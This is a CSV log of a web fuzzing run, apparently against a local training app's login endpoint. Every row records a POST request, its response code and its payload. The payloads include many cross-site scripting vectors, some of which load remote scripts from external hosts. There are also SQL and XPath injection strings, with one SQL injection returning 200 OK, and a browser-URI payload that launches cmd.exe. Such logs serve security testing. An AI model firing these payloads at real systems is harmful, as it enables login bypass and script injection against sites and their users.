Task ID,Message Type,Req. Timestamp,Método,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
93,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,20,448,527,286,1107,,,"[navigatorurl:test"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)]"
86,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,390,448,151,332,26,,,[&#60;SCRIPT a&#61;&#96;&#62;&#96; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;]
95,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,84,447,69,286,1109,,,"[httP://aa""><script>alert(123)</script>]"
87,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,452,448,205,332,26,,,[&#60;SCRIPT&#62;document.write&#40;&#34;&#60;SCRI&#34;&#41;&#59;&#60;&#47;SCRIPT&#62;PT SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;]
88,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,403,448,161,332,26,,,[&#60;SCRIPT a&#61;&#34;&#62;&#39;&#62;&#34; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;]
94,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,287,448,108,332,26,,,[res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210]
96,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,196,447,69,286,1278,,Reflected,[httP://aa'><script>alert(123)</script>]
97,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,250,447,67,332,26,,,[httP://aa<script>alert(123)</script>]
98,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,232,447,42,332,26,,,[' or '1'='1]
99,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,230,447,40,332,26,,,[' or ''=']
101,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,238,447,32,332,26,,,[/]
102,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,227,447,33,332,26,,,[//]
103,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,246,447,34,332,26,,,[//*]
100,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,200,OK,417,447,50,331,763,,,[x' or 1=1 or 'x'='y]
104,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,288,447,34,332,26,,,[*/*]
105,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,278,447,33,332,26,,,[@*]
106,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,250,447,52,332,26,,,[count(/child::node())]
107,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,253,447,64,286,1259,,Reflected,[x' or name()='username' or 'x'='y]
108,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,268,447,60,286,1255,,Reflected,[<script>alert('xss')</script>]
109,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,248,447,84,332,26,,,"[<script>alert(string.fromcharcode(88,83,83))</script>]"
110,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,231,447,64,332,26,,,[</title><script>alert(1)</script>]
111,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,219,447,59,286,1248,,Reflected,['> <script>alert(3)</script>]
115,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,6,447,65,286,1109,,,"[<<script>alert(""xss"");//<</script>]"
116,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,9,447,34,286,1109,,,"[>""']"
117,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,10,447,49,286,1109,,,"['';!--""<XSS>=&{()}]"
112,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,140,447,59,332,26,,,[`> <script>alert(5)</script>]
113,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,202,447,58,332,26,,,[> <script>alert(4)</script>]
114,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,213,447,64,332,26,,,[</title><script>alert(1)</script>]
119,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,198,447,82,286,1319,,Reflected,['%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e']
123,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,23,447,79,286,1109,,,"[<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>]"
120,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,220,447,79,332,26,,,[<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>]
124,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,14,447,83,286,1109,,,"[<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""XSS"")>]"
125,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,12,447,89,286,1109,,,"[perl -e 'print ""<SCR\0IPT>alert(""XSS"")</SCR\0IPT>"";' > out]"
126,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,16,448,109,286,1109,,,"[<DIV STYLE=""background-image: url(http://ha.ckers.org/xss.js)"">Div Body</DIV> ]"
118,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,259,447,67,332,26,,,[*/a=eval;b=alert;a(b(/e/.source));/*]
127,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,23,448,107,286,1109,,,"[<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>]"
130,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,16,447,93,286,1109,,,"[<SCRIPT a=""blah"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>]"
128,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,29,447,87,286,1109,,,"[<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>]"
129,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,28,447,89,286,1109,,,"[<SCRIPT =""blah"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>]"
131,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,15,447,89,286,1109,,,"[<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>]"
132,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,20,447,87,286,1109,,,"[<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>]"
121,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,197,447,98,332,26,,,[%26%2339);x=alert;x(%26%2340 /finally through!/.source %26%2341);//]
133,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,33,448,117,286,1109,,,"[<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>]"
134,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,23,447,89,286,1109,,,"[<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>]"
136,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,17,447,85,286,1109,,,"[<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>]"
137,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,67,448,121,286,1107,,,"[(1?(1?{a:1?""""[1?""ev\a\l"":0](1?""\a\lert"":0):0}:0).a:0)[1?""\c\a\l\l"":0](content,1?""x\s\s"":0)]"
138,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,66,447,82,286,1109,,,"[<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>]"
140,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,61,447,75,286,1109,,,"[<A HREF=""http://google:ha.ckers.org"">XSS</A>]"
141,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,60,447,75,286,1109,,,"[<A HREF=""http://ha.ckers.org@google"">XSS</A>]"
122,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,315,448,129,332,26,,,[</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>]
142,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,50,447,57,286,1109,,,"[<A HREF=""//google"">XSS</A>]"
145,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,32,448,173,286,1109,,,"[sstyle=foobar""tstyle=""foobar""ystyle=""foobar""lstyle=""foobar""estyle=""foobar""=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)"" a=""]"
135,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,303,447,69,332,26,,,[<SCRIPT SRC=http://ha.ckers.org/xss.js]
147,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,16,447,89,286,1109,,,"[style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);"" a=""]"
139,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,307,447,69,332,26,,,[<SCRIPT SRC=http://ha.ckers.org/xss.js]
149,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,28,448,156,286,1109,,,"[';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'><SCRIPT>alert(4)</SCRIPT>=&{}"");}alert(6);function xss(){//]"
143,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,220,447,79,332,26,,,[<IFRAME SRC=http://ha.ckers.org/scriptlet.html <]
144,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,197,447,61,332,26,,,[y=<a>alert</a>;content[y](123)]
150,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,14,448,171,286,1109,,,"[';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}"");}]"
151,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,20,447,78,286,1109,,,"['';!--""<script>alert(0);</script>=&{(alert(1))}]"
146,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,169,447,64,332,26,,,[with(document.__parent__)alert(1)]
154,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,31,447,49,286,1109,,,"['';!--""<XSS>=&{()}]"
148,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,351,448,180,332,26,,,[<s>000<s>%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&#60&#115&#62&#51&#51&#51&#60&#47&#115&#62&#x3c&#x73&#x3e&#x34&#x34&#x34&#x3c&#x2f&#x73&#x3e]
157,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,12,447,78,286,1109,,,"[<IMG SRC=`javascript:alert(""XSS says, 'XSS'"")`>]"
152,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,318,447,64,332,26,,,[</title><script>alert(1)</script>]
158,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,5,447,73,286,1107,,,"[<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">"",]"
153,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,316,448,129,332,26,,,[</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>]
155,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,306,447,64,286,1267,,Reflected,[<IMG SRC=javascript:alert('XSS')>]
162,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,36,447,73,286,1109,,,"[<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">]"
156,Fuzzed,Mon Jun 01 18:51:51 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,318,447,64,286,1267,,Reflected,[<IMG SRC=JaVaScRiPt:alert('XSS')>]
163,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,70,447,78,286,1109,,,"[<IMG SRC=""jav&#x09;ascript:alert(<WBR>'XSS');"">]"
164,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,71,447,78,286,1109,,,"[<IMG SRC=""jav&#x0A;ascript:alert(<WBR>'XSS');"">]"
166,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,30,448,143,286,1107,,,"[</a style=""""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')"">]"
167,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,51,447,70,286,1109,,,"[style=color: expression(alert(0));"" a=""]"
159,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,242,447,88,332,26,,,"[<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>]"
160,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,241,448,167,332,26,,,[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]
161,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,241,448,156,332,26,,,[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]
165,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,133,447,72,332,26,,,[<img src=`x` onrerror= ` ;; alert(1) ` />]
171,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,30,447,77,286,1109,,,"[<DIV STYLE=""width: expression(alert('XSS'));"">]"
172,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,28,447,73,286,1109,,,"[<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">]"
173,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,46,447,67,286,1109,,,"[<IMG SRC=""javascript:alert('XSS');"">]"
174,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,44,447,90,286,1109,,,"[<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>]"
175,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,41,447,83,286,1109,,,"[<IMG SRC=`javascript:alert(""RSnake says### 'XSS'"")`>]"
176,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,36,447,65,286,1109,,,"[<IMG SRC=""javascript:alert('XSS')""]"
168,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,280,447,81,332,26,,,[vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<]
179,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,17,447,79,286,1109,,,"[<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>]"
169,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,264,448,105,332,26,,,[width: expression((window.r==document.cookie)?'':alert(r=document.cookie))]
170,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,263,447,91,286,1348,,Reflected,[<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->]
177,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,147,448,156,332,26,,,[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]
178,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,157,447,74,332,26,,,[<IMG SRC=javascript:alert(&quot;XSS&quot;)>]
181,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,51,447,70,286,1109,,,"[<IMG DYNSRC=""javascript:alert('XSS');"">]"
182,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,53,447,70,286,1109,,,"[<IMG LOWSRC=""javascript:alert('XSS');"">]"
184,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,38,448,121,286,1109,,,"[exp/*<XSS STYLE='no\xss:noxss(""*//*"");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>]"
185,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,54,447,67,286,1109,,,"[<IMG SRC=""javascript:alert('XSS');"">]"
186,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,54,447,65,286,1109,,,"[<IMG SRC='vbscript:msgbox(""XSS"")'>]"
187,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,51,447,82,286,1109,,,"[<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">]"
188,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,25,448,111,286,1109,,,"[<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS]"
189,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,25,447,88,286,1109,,,"[<XSS STYLE=""behavior: url(http://ha.ckers.org/xss.htc);"">]"
191,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,43,447,65,286,1109,,,"[<IMGSRC=""javascript:alert('XSS')"">]"
193,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,35,447,75,286,1109,,,"[<IMG SRC="" &#14;  javascript:alert('XSS');"">]"
194,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,23,447,73,286,1109,,,"[<XSS STYLE=""xss:expression(alert('XSS'))"">]"
195,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,8,448,109,286,1109,,,"[<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>]"
180,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,256,447,92,332,26,,,[<IMG SRC=javascript:alert(String.fromCharCode(88###83###83))>]
196,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,9,448,117,286,1109,,,"[<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>]"
183,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,255,447,64,286,1267,,Reflected,[<IMG SRC=javascript:alert('XSS')>]
197,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,8,447,83,286,1109,,,"[<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>]"
198,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,12,447,80,286,1109,,,"[<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">]"
190,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,165,448,248,332,26,,,[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]
200,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,36,448,121,286,1109,,,"[firefoxurl:test|""%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');""]"
192,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,173,448,145,286,1510,,Reflected,[<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>]
199,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,158,448,167,332,26,,,[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]
201,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,249,448,108,332,26,,,[res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210]
203,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,224,447,39,332,26,,,[alert(1)]
202,Fuzzed,Mon Jun 01 18:51:52 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,252,447,89,332,26,,,[>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>]
205,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,114,447,41,332,26,,,[+alert(0)+]
204,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,222,447,43,332,26,,,[A=alert;A(1)]
207,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,150,447,61,332,26,,,[a=1;a=eval;b=alert;a(b(11));//]
